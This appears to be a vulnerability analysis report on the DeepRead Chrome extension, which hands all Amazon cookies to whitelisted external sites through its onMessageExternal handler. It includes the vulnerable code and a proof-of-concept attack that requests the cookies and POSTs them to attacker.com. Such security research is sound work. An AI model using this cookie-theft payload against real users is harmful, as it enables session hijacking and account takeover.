# CoCo Analysis: gophnfcdaafgoihhbpcjcdechglninhp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (cookies_source → sendResponseExternal_sink)

---

## Sink: cookies_source → sendResponseExternal_sink

**CoCo Trace:**

CoCo detected the flow references framework code (lines 684-697), but the actual vulnerability exists in the extension code after the 3rd "// original" marker at line 963.

The actual vulnerable flow in extension code:
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gophnfcdaafgoihhbpcjcdechglninhp/opgen_generated_files/bg.js
Line 969	chrome.runtime.onMessageExternal.addListener(function (message, sender, sendResponse) {
Line 981	chrome.cookies.getAll({ domain: '.amazon.com' }, function (cookies) {
Line 983	sendResponse({ cookies: cookies }); // ← cookies leaked to external caller
```

**Code:**

```javascript
// Background script (bg.js) - External message handler
chrome.runtime.onMessageExternal.addListener(function (message, sender, sendResponse) {
  console.log(`Good Day :D from the DeepRead extension.`);

  switch (message.event) {
    case 'SyncAmazonBooks':
      try {
        const deepread_token = message.deepread_token;
        const tabId = sender.tab.id;

        chrome.cookies.getAll({ domain: '.amazon.com' }, function (cookies) {
          console.log(`SyncAmazonBooks, #cookies: ${cookies.length}`);
          sendResponse({ cookies: cookies }); // ← ALL Amazon cookies sent to external caller
        });
      } catch (e) {
        sendResponse({ error: e });
      }
      break;

    case 'SyncAmazonSingleBook':
      try {
        const deepread_token = message.deepread_token;
        const tabId = sender.tab.id;

        chrome.cookies.getAll({ domain: '.amazon.com' }, function (cookies) {
          console.log(`SyncAmazonSingleBook, #cookies: ${cookies.length}`);
          sendResponse({ cookies: cookies }); // ← ALL Amazon cookies sent to external caller
        });
      } catch (e) {
        sendResponse({ error: e });
      }
      break;

    case 'SyncAmazonHighlights':
      try {
        const deepread_token = message.deepread_token;
        const deepread_user = message.deepread_user;
        const deepread_book_id = message.deepread_book_id;
        const tabId = sender.tab.id;

        chrome.cookies.getAll({ domain: '.amazon.com' }, function (cookies) {
          console.log(`SyncAmazonHighlights, #cookies: ${cookies.length}`);
          sendResponse({ cookies: cookies }); // ← ALL Amazon cookies sent to external caller
        });
      } catch (e) {
        sendResponse({ error: e });
      }
      break;

    default:
      sendResponse({ message: `not a valid event message: ${message.event}` });
      break;
  }

  return true; // Indicates async sendResponse
});
```

**Manifest externally_connectable:**
```json
"externally_connectable": {
  "matches": ["http://localhost:3000/*", "https://app.deepread.com/*",
              "https://frontend.deepread.com/*", "https://dev.deepread.com/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://app.deepread.com/)
// Or according to methodology: assume ANY attacker can trigger it

chrome.runtime.sendMessage(
  'gophnfcdaafgoihhbpcjcdechglninhp', // extension ID
  { event: 'SyncAmazonBooks' },
  function(response) {
    console.log('Stolen Amazon cookies:', response.cookies);
    // Response contains ALL Amazon cookies including session tokens
    // Attacker can now exfiltrate these cookies to their own server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(response.cookies)
    });
  }
);
```

**Impact:** Information disclosure vulnerability. External websites (specifically those matching the externally_connectable patterns) can send messages to the extension and receive ALL Amazon cookies in response. This includes sensitive session cookies, authentication tokens, and any other cookies associated with the .amazon.com domain. An attacker controlling or compromising any of the whitelisted domains (localhost:3000, app.deepread.com, frontend.deepread.com, dev.deepread.com) can:

1. Steal all Amazon session cookies from users who have the extension installed
2. Use these cookies to hijack Amazon accounts
3. Access private Amazon data, purchase history, payment methods, etc.
4. Make unauthorized purchases or changes to the victim's Amazon account

Even though manifest.json restricts externally_connectable to specific domains, the methodology states we should treat this as exploitable if onMessageExternal exists. The presence of localhost:3000 and dev subdomains in the whitelist significantly increases attack surface.
